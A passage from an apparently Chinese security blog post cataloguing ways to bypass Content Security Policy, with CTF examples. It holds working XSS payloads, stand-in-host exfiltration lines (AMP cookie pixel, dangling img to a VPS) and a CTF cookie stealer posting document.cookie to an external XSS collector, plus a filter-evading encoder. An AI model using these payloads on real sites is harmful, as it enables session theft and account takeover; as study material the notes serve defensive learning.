<p>这个是存在低版本angular js的cdn服务商列表<br><a href="https://github.com/google/csp-evaluator/blob/master/whitelist_bypasses/angular.js#L26-L76" target="_blank" rel="noopener">https://github.com/google/csp-evaluator/blob/master/whitelist_bypasses/angular.js#L26-L76</a><br>除了低版本angular js的模板注入，还有许多库可以绕过CSP<br>下面引用<a href="https://www.jianshu.com/p/f1de775bc43e" target="_blank" rel="noopener">https://www.jianshu.com/p/f1de775bc43e</a><br>如果用了Jquery-mobile库，且CSP中包含”script-src ‘unsafe-eval’”或者”script-src ‘strict-dynamic’”，可以用此exp</p>
<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">data-role</span>=<span class="string">popup</span> <span class="attr">id</span>=<span class="string">'&lt;script&gt;alert(1)&lt;/script&gt;'</span>&gt;</span><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br></pre></td></tr></table></figure>
<p>还比如RCTF2018题目出现的AMP库,下面的标签可以获取名字为FLAG的cookie</p>
<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">amp-pixel</span> <span class="attr">src</span>=<span class="string">"http://your domain/?cid=CLIENT_ID(FLAG)"</span>&gt;</span><span class="tag">&lt;/<span class="name">amp-pixel</span>&gt;</span></span><br></pre></td></tr></table></figure>
<p>blackhat2017有篇ppt总结了可以被用来绕过CSP的一些JS库<br><a href="https://www.blackhat.com/docs/us-17/thursday/us-17-Lekies-Dont-Trust-The-DOM-Bypassing-XSS-Mitigations-Via-Script-Gadgets.pdf" target="_blank" rel="noopener">https://www.blackhat.com/docs/us-17/thursday/us-17-Lekies-Dont-Trust-The-DOM-Bypassing-XSS-Mitigations-Via-Script-Gadgets.pdf</a></p>
<p>利用条件:</p>
<ul>
<li>CDN服务商存在某些低版本的js库</li>
<li>此CDN服务商在CSP白名单中</li>
</ul>
<h2 id="站点可控静态资源绕过"><a href="#站点可控静态资源绕过" class="headerlink" title="站点可控静态资源绕过"></a>站点可控静态资源绕过</h2><p>给一个绕过codimd的(实例)codimd xss<br>案例中codimd的CSP中使用了<a href="http://www.google-analytics.com" target="_blank" rel="noopener">www.google-analytics.com</a><br>而<a href="http://www.google-analytics.com" target="_blank" rel="noopener">www.google-analytics.com</a> 中提供了自定义javascript的功能（google会封装自定义的js，所以还需要unsafe-eval），于是可以绕过CSP</p>
<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">meta</span> <span class="attr">http-equiv</span>=<span class="string">"Content-Security-Policy"</span> <span class="attr">content</span>=<span class="string">"default-src 'self'; script-src 'unsafe-eval' https://www.google-analytics.com"</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">src</span>=<span class="string">"https://www.google-analytics.com/gtm/js?id=GTM-PJF5W64"</span>&gt;</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p>同理，若其他站点下提供了可控静态资源的功能，且CSP中允许了此站点，则可以采用此方式绕过</p>
<p>利用条件:   </p>
<ul>
<li>站点存在可控静态资源</li>
<li>站点在CSP白名单中</li>
</ul>
<h2 id="jsonp"><a href="#jsonp" class="headerlink" title="jsonp"></a>jsonp</h2><p>大部分站点的jsonp是完全可控的，只不过有些站点会让jsonp不返回html类型防止直接的反射型XSS，但是如果将url插入到script标签中，除非设置x-content-type-options头，否者尽管返回类型不一致，浏览器依旧会当成js进行解析</p>
<p>利用条件:</p>
<ul>
<li>站点存在可控Jsonp</li>
<li>站点在CSP白名单中</li>
</ul>
<h2 id="base-uri绕过"><a href="#base-uri绕过" class="headerlink" title="base-uri绕过"></a>base-uri绕过</h2><p>第一次知道base-uri绕过是RCTF 2018 rBlog的非预期解<a href="https://blog.cal1.cn/post/RCTF" target="_blank" rel="noopener">https://blog.cal1.cn/post/RCTF</a> 2018 rBlog writeup<br>当服务器CSP script-src采用了nonce时，如果只设置了default-src没有额外设置base-uri，就可以使用<base>标签使当前页面上下文为自己的vps，如果页面中的合法script标签采用了相对路径，那么最终加载的js就是针对base标签中指定url的相对路径<br>exp</p>
<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">meta</span> <span class="attr">http-equiv</span>=<span class="string">"Content-Security-Policy"</span> <span class="attr">content</span>=<span class="string">"default-src 'self'; script-src 'nonce-test'"</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">base</span> <span class="attr">href</span>=<span class="string">"//vps_ip/"</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">nonce</span>=<span class="string">'test'</span> <span class="attr">src</span>=<span class="string">"2.js"</span>&gt;</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure>
<p>注意：如果页面的script-src不是采用的nonce而是self或者域名ip，则不能使用此方法，因为vps_ip不在csp白名单内</p>
<p>利用条件:</p>
<ul>
<li>script-src只使用nonce</li>
<li>没有额外设置base-uri</li>
<li>页面引用存在相对路径的<script>标签</li>
</ul>
<h2 id="不完整script标签绕过nonce"><a href="#不完整script标签绕过nonce" class="headerlink" title="不完整script标签绕过nonce"></a>不完整script标签绕过nonce</h2><p>考虑下下列场景，如果存在这样场景，该怎么绕过CSP</p>
<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="php"><span class="meta">&lt;?php</span> header(<span class="string">"X-XSS-Protection:0"</span>);<span class="meta">?&gt;</span></span></span><br><span class="line"><span class="tag">&lt;<span class="name">meta</span> <span class="attr">http-equiv</span>=<span class="string">"Content-Security-Policy"</span> <span class="attr">content</span>=<span class="string">"default-src 'self'; script-src 'nonce-xxxxx'"</span>&gt;</span></span><br><span class="line"><span class="php"><span class="meta">&lt;?php</span> <span class="keyword">echo</span> $_GET[<span class="string">'xss'</span>]<span class="meta">?&gt;</span></span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">nonce</span>=<span class="string">'xxxxx'</span>&gt;</span></span><br><span class="line"><span class="actionscript">  <span class="comment">//do some thing</span></span></span><br><span class="line"><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure>
<p>如果我们输入 <code>http://127.0.0.1/2.php?xss=&lt;script src=data:text/plain,alert(1)</code> 即可xss<br>这是因为当浏览器碰到一个左尖括号时，会变成标签开始状态，然后会一直持续到碰到右尖括号为止，在其中的数据都会被当成标签名或者属性，所以第五行的<code>&lt;script</code>会变成一个属性，值为空，之后的nonce='xxxxx'会被当成我们输入的<code>script</code>的标签的一个属性，相当于我们盗取了合法的script标签中的nonce，于是成功绕过了scripr-src</p>
<p>利用条件: </p>
<ul>
<li>可控点在合法script标签上方,且其中没有其他标签</li>
<li>XSS页面的CSP script-src只采用了nonce方式</li>
</ul>
<h2 id="object-src绕过（PDFXSS）"><a href="#object-src绕过（PDFXSS）" class="headerlink" title="object-src绕过（PDFXSS）"></a>object-src绕过（PDFXSS）</h2><p>假如只有这一个页面，我们能有办法执行JS吗</p>
<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">meta</span> <span class="attr">http-equiv</span>=<span class="string">"Content-Security-Policy"</span> <span class="attr">content</span>=<span class="string">"script-src 'self'"</span>&gt;</span></span><br><span class="line"><span class="php"><span class="meta">&lt;?php</span> <span class="keyword">echo</span> $_GET[<span class="string">'xss'</span>]<span class="meta">?&gt;</span></span></span><br></pre></td></tr></table></figure>
<p>在CSP标准里面，有一个属性是object-src，它限制的是<code>&lt;embed&gt; &lt;object&gt; &lt;applet&gt;</code>标签的src，也就是插件的src<br>于是我们可以通过插件来执行Javascript代码，插件的js代码并不受script-src的约束<br>最常见的就是flash-xss，但是flash实在太老，而且我想在看的师傅们也很少会开浏览器的flash了，所以我这里也不说明了，这里主要讲之前一个提交asrc的pdf-xss为例<br>PDF文件中允许执行javascript脚本，但是之前浏览器的pdf解析器并不会解析pdf中的js，但是之前chrome的一次更新中突然允许加载pdf的javascript脚本</p>
<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">66<span class="tag">&lt;<span class="name">embed</span> <span class="attr">width</span>=<span class="string">"100%"</span> <span class="attr">height</span>=<span class="string">"100%"</span> <span class="attr">src</span>=<span class="string">"//vps_ip/123.pdf"</span>&gt;</span><span class="tag">&lt;/<span class="name">embed</span>&gt;</span></span><br></pre></td></tr></table></figure>



<p>当然pdf的xss并不是为所欲为，比如pdf-xss并不能获取页面cookie，但是可以弹窗，url跳转等<br>具体可以看看这篇文章<a href="https://blog.csdn.net/microzone/article/details/52850623" target="_blank" rel="noopener">https://blog.csdn.net/microzone/article/details/52850623</a><br>里面有上面实例用的恶意pdf文件</p>
<p>当然，上面的例子并没有设置default-src,所以我们可以用外域的pdf文件，如果设置了default-src，我们必须找到一个pdf的上传点，（当然能上传的话直接访问这个pdf就能xss了2333），然后再用标签引用同域的pdf文件</p>
<p>利用条件:</p>
<ul>
<li>没有设置object-src，或者object-src没有设置为'none'</li>
<li>pdf用的是chrome的默认解析器</li>
</ul>
<h2 id="SVG绕过"><a href="#SVG绕过" class="headerlink" title="SVG绕过"></a>SVG绕过</h2><p>SVG作为一个矢量图，但是却能够执行javascript脚本，如果页面中存在上传功能，并且没有过滤svg，那么可以通过上传恶意svg图像来xss</p>
<p>1.svg</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">&lt;?xml version&#x3D;&quot;1.0&quot; encoding&#x3D;&quot;UTF-8&quot; standalone&#x3D;&quot;no&quot;?&gt;</span><br><span class="line">&lt;!DOCTYPE svg PUBLIC &quot;-&#x2F;&#x2F;W3C&#x2F;&#x2F;DTD SVG 1.1&#x2F;&#x2F;EN&quot; &quot;http:&#x2F;&#x2F;www.w3.org&#x2F;Graphics&#x2F;SVG&#x2F;1.1&#x2F;DTD&#x2F;svg11.dtd&quot;&gt;</span><br><span class="line">&lt;svg version&#x3D;&quot;1.1&quot; id&#x3D;&quot;Layer_1&quot; xmlns&#x3D;&quot;http:&#x2F;&#x2F;www.w3.org&#x2F;2000&#x2F;svg&quot; xmlns:xlink&#x3D;&quot;http:&#x2F;&#x2F;www.w3.org&#x2F;1999&#x2F;xlink&quot; x&#x3D;&quot;0px&quot; y&#x3D;&quot;0px&quot; width&#x3D;&quot;100px&quot; height&#x3D;&quot;100px&quot; viewBox&#x3D;&quot;0 0 751 751&quot; enable-background&#x3D;&quot;new 0 0 751 751&quot; xml:space&#x3D;&quot;preserve&quot;&gt;  &lt;image id&#x3D;&quot;image0&quot; width&#x3D;&quot;751&quot; height&#x3D;&quot;751&quot; x&#x3D;&quot;0&quot; y&#x3D;&quot;0&quot;</span><br><span class="line">    href&#x3D;&quot;data:image&#x2F;png;base64,iVBORw0KGgoAAAANSUhEUgAAAu8AAALvCAIAAABa4bwGAAAAIGNIUk0AAHomAACAhAAA+gAAAIDo&quot; &#x2F;&gt;</span><br><span class="line">&lt;script&gt;alert(1)&lt;&#x2F;script&gt;</span><br><span class="line">&lt;&#x2F;svg&gt;</span><br></pre></td></tr></table></figure>
<p>利用条件:</p>
<ul>
<li>可以上传svg图片</li>
</ul>
<h2 id="不完整的资源标签获取资源"><a href="#不完整的资源标签获取资源" class="headerlink" title="不完整的资源标签获取资源"></a>不完整的资源标签获取资源</h2><p>看看下面的例子，我们如何把flag给带出来</p>
<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">meta</span> <span class="attr">http-equiv</span>=<span class="string">"Content-Security-Policy"</span> <span class="attr">content</span>=<span class="string">"default-src 'self';script-src 'self'; img-src *;"</span>&gt;</span></span><br><span class="line"><span class="php"><span class="meta">&lt;?php</span> <span class="keyword">echo</span> $_GET[<span class="string">'xss'</span>]<span class="meta">?&gt;</span></span></span><br><span class="line"><span class="tag">&lt;<span class="name">h1</span>&gt;</span>flag&#123;0xffff&#125;<span class="tag">&lt;/<span class="name">h1</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">h2</span> <span class="attr">id</span>=<span class="string">"id"</span>&gt;</span>3<span class="tag">&lt;/<span class="name">h2</span>&gt;</span></span><br></pre></td></tr></table></figure>
<p>这里可以注意到img用了*,有些网站会用很多外链图片，所以这个情况并不少见<br>虽然我们可以新建任意标签，但是由于CSP我们的JS并不能执行（没有unsafe-inline），于是我们可以用不完整的<code>&lt;img</code>标签来将数据带出</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">exp: http:&#x2F;&#x2F;127.0.0.1&#x2F;2.php?xss&#x3D;&lt;img src&#x3D;&quot;&#x2F;&#x2F;VPS_IP?a&#x3D;</span><br></pre></td></tr></table></figure>
<p>此时，由于src的引号没有闭合，html解析器会去一直寻找第二个引号，引号其中的大部分标签都不会被解析，所以在第四行的第一个引号前的所有内容，都会被当成src的值被发送到我们的vps上<br>需要注意的是，chrome下这个exp并不会成功，因为chrome不允许发出的url中含有回车或<，否者不会发出</p>
<p>利用条件:</p>
<ul>
<li>可以加载外域资源 (img-src: *)</li>
<li>需要获取页面某处的信息</li>
</ul>
<h2 id="CSS选择器获取内容"><a href="#CSS选择器获取内容" class="headerlink" title="CSS选择器获取内容"></a>CSS选择器获取内容</h2><h2 id="CRLF绕过"><a href="#CRLF绕过" class="headerlink" title="CRLF绕过"></a>CRLF绕过</h2><p>HCTF2018的一道题，当一个页面存在CRLF漏洞时，且我们的可控点在CSP上方，就可以通过注入回车换行，将CSP挤到HTTP返回体中，这样就绕过了CSP<br>原题github <a href="https://github.com/Lou00/HCTF2018_Bottle" target="_blank" rel="noopener">https://github.com/Lou00/HCTF2018_Bottle</a></p>
<h1 id="例题"><a href="#例题" class="headerlink" title="例题"></a>例题</h1><h2 id="CISCN2019-华东北赛区-Web2"><a href="#CISCN2019-华东北赛区-Web2" class="headerlink" title="[CISCN2019 华东北赛区]Web2"></a>[CISCN2019 华东北赛区]Web2</h2><p><a href="https://mochu.blog.csdn.net/article/details/105212961" target="_blank" rel="noopener">https://mochu.blog.csdn.net/article/details/105212961</a></p>
<p>投稿存在XSS，但是存在一些过滤，使用Markup<br>转码，然后eval执行JS代码，并且需要一个window.location.href来自动触发刷新颜面<br>使用题目提供的站内XSS平台</p>
<p>添加windows.location.href，并删去if判断那一段</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">(function()&#123;window.location.href&#x3D;&#39;http:&#x2F;&#x2F;xss.buuoj.cn&#x2F;index.php?do&#x3D;api&amp;id&#x3D;arHAGx&amp;location&#x3D;&#39;+escape((function()&#123;try&#123;return document.location.href&#125;catch(e)&#123;return &#39;&#39;&#125;&#125;)())+&#39;&amp;toplocation&#x3D;&#39;+escape((function()&#123;try&#123;return top.location.href&#125;catch(e)&#123;return &#39;&#39;&#125;&#125;)())+&#39;&amp;cookie&#x3D;&#39;+escape((function()&#123;try&#123;return document.cookie&#125;catch(e)&#123;return &#39;&#39;&#125;&#125;)())+&#39;&amp;opener&#x3D;&#39;+escape((function()&#123;try&#123;return (window.opener &amp;&amp; window.opener.location.href)?window.opener.location.href:&#39;&#39;&#125;catch(e)&#123;return &#39;&#39;&#125;&#125;)());&#125;)();</span><br></pre></td></tr></table></figure>
<p>然后利用脚本，进行编码绕过，并且执行</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">xss=<span class="string">'''(function()&#123;window.location.href='http://xss.buuoj.cn/index.php?do=api&amp;id=arHAGx&amp;location='+escape((function()&#123;try&#123;return document.location.href&#125;catch(e)&#123;return ''&#125;&#125;)())+'&amp;toplocation='+escape((function()&#123;try&#123;return top.location.href&#125;catch(e)&#123;return ''&#125;&#125;)())+'&amp;cookie='+escape((function()&#123;try&#123;return document.cookie&#125;catch(e)&#123;return ''&#125;&#125;)())+'&amp;opener='+escape((function()&#123;try&#123;return (window.opener &amp;&amp; window.opener.location.href)?window.opener.location.href:''&#125;catch(e)&#123;return ''&#125;&#125;)());&#125;)();'''</span></span><br><span class="line">output = <span class="string">""</span></span><br><span class="line"><span class="keyword">for</span> c <span class="keyword">in</span> xss:</span><br><span class="line">    output += <span class="string">"&amp;#"</span> + str(ord(c))</span><br><span class="line"></span><br><span class="line">print(<span class="string">"&lt;svg&gt;&lt;script&gt;eval&amp;#40&amp;#34"</span> + output + <span class="string">"&amp;#34&amp;#41&lt;/script&gt;"</span>)</span><br></pre></td></tr></table></figure>


<p>参考文章:<br>前端HACK之XSS攻击个人学习笔记 <a href="http://www.cnfluffy.com/2019-03-11/4963" target="_blank" rel="noopener">http://www.cnfluffy.com/2019-03-11/4963</a><br>dom型<br><a href="https://github.com/JnuSimba/MiscSecNotes/blob/master/%E8%B7%A8%E7%AB%99%E8%84%9A%E6%9C%AC/DOMXSS.md" target="_blank" rel="noopener">https://github.com/JnuSimba/MiscSecNotes/blob/master/%E8%B7%A8%E7%AB%99%E8%84%9A%E6%9C%AC/DOMXSS.md</a><br>解码顺序  <a href="https://github.com/JnuSimba/MiscSecNotes/blob/master/%E8%B7%A8%E7%AB%99%E8%84%9A%E6%9C%AC/%E8%A7%A3%E7%A0%81%E9%A1%BA%E5%BA%8F.md" target="_blank" rel="noopener">https://github.com/JnuSimba/MiscSecNotes/blob/master/%E8%B7%A8%E7%AB%99%E8%84%9A%E6%9C%AC/%E8%A7%A3%E7%A0%81%E9%A1%BA%E5%BA%8F.md</a>   </p>
<p><a href="https://www.ruanyifeng.com/blog/2016/09/csp.html" target="_blank" rel="noopener">Content Security Policy 入门教程</a><br><a href="https://xz.aliyun.com/t/4067" target="_blank" rel="noopener">XSS总结</a></p>
</div><div class="post-copyright"><div class="post-copyright-author"><span class="post-copyright-meta">本文作者: </span><span class="post-copyright-info"><a href="mailto:undefined">ye1s</a></span></div><div class="post-copyright-type"><span class="post-copyright-meta">本文链接: </span><span class="post-copyright-info"><a href="https://blog.cfyqy.com/article/c84cebac.html">https://blog.cfyqy.com/article/c84cebac.html</a></span></div><div class="post-copyright-notice"><span class="post-copyright-meta">版权声明: </span><span class="post-copyright-info">本博客所有文章除特别声明外，均采用 <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/" target="_blank" rel="noopener">CC BY-NC-SA 4.0</a> 许可协议。转载请注明来自 <a href="https://blog.cfyqy.com">ye1s</a>！</span></div></div><div class="post-copyright" id="comments-container"><script src="/js/comments/gitment.js"></script></div><script>let arr = location.href.split('/#more')[0].split('/');
let title = arr[arr.length - 1];
if (title === '') {
    title = arr[arr.length - 2]
}
var flag = false;
var gitFun = function () {
    try {
        var gitmentObj = window.GLOBAL_CONFIG.gitment;
        var gitment = new Gitment({
            id: decodeURI(title), // 可选。默认为 location.href
            owner: gitmentObj.owner,
            repo: gitmentObj.repo,
            oauth: {
                client_id: gitmentObj.client_id,
                client_secret: gitmentObj.client_secret
            },
        });
        gitment.render('comments-container');
        flag = true;
    } catch (e) {
        flag = false;
    }
}
var setIn = setInterval(() => {
    if (!flag) {
        gitFun();
    } else {
        clearInterval(setIn);
    }
}, 200);</script></article><div id="pagination"><div class="prev-post pull-left"><span class="line line-top"></span><span class="line line-right"></span><span class="line line-bottom"></span><span class="line line-left"></span><a href="/article/72e5cf06.html"><i class="fas fa-angle-left">&nbsp;</i><span>同源策略</span></a></div><div class="next-post pull-right"><span class="line line-top"></span><span class="line line-right"></span><span class="line line-bottom"></span><span class="line line-left"></span><a href="/article/dc7e61bd.html"><span>xxe漏洞</span><span>&nbsp;</span><i class="fas fa-angle-right"></i></a></div></div><!--div!= paginator()--></div></div><div class="button-hover" id="return-top"><i class="fas fa-arrow-up" aria-hidden="true"></i></div><footer><div id="footer"><div class="button-hover" id="side-button"><i class="fas fa-arrow-right"></i></div><div class="right-content"><div class="busuanzi"><script async src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script><span id="busuanzi_container_page_pv"><i class="fas fa-file-o"></i></span><span id="busuanzi_value_page_pv"></span><span></span></div><div class="copyright">&copy;2017 ～ 2021 By ye1s</div></div></div></footer></div><!--js(src=url_for(url) + '?version=' + version())--><script src="/js/thirdparty/jquery-3.3.1.min.js"></script><!--script(src=url)--><!--js(src=url_for(url) + '?version=' + version())--><script src="/js/thirdparty/velocity.min.js"></script><!--script(src=url)--><!--js(src=url_for(url) + '?version=' + version())--><script src="/js/thirdparty/jquery.mCustomScrollbar.concat.min.js"></script><!--script(src=url)--><!--js(src=url_for(url) + '?version=' + version())--><script src="/js/fan.js"></script><!--script(src=url)--><!--js(src=url_for(url) + '?version=' + version())--><script src="/js/canvas_bg.js"></script><!--script(src=url)--><!--js(src=url_for(url) + '?version=' + version())--><script src="/js/utils.js"></script><!--script(src=url)--><!--js(src=url_for(url) + '?version=' + version())--><script src="/js/scroll.js"></script><!--script(src=url)--><!--js(src=url_for(url) + '?version=' + version())--><script src="/js/sidebar.js"></script><!--script(src=url)--><!--js(src=url_for(url) + '?version=' + version())--><script src="/js/copy.js"></script><!--script(src=url)--><!--js(src=url_for(url) + '?version=' + version())--><script src="/js/daovoice.js"></script><!--script(src=url)--><div class="search-dialog"><div id="algolia-search-title">Algolia</div><div class="search-close-button"><i class="fa fa-times"></i></div><!--div#current-refined-values--><!--div#clear-all--><div id="search-box"></div><!--div#refinement-list--><hr><div id="hits"></div><div id="algolia-pagination"></div></div><div class="search-mask"></div><script src="/js/search/algolia.js"></script></body></html>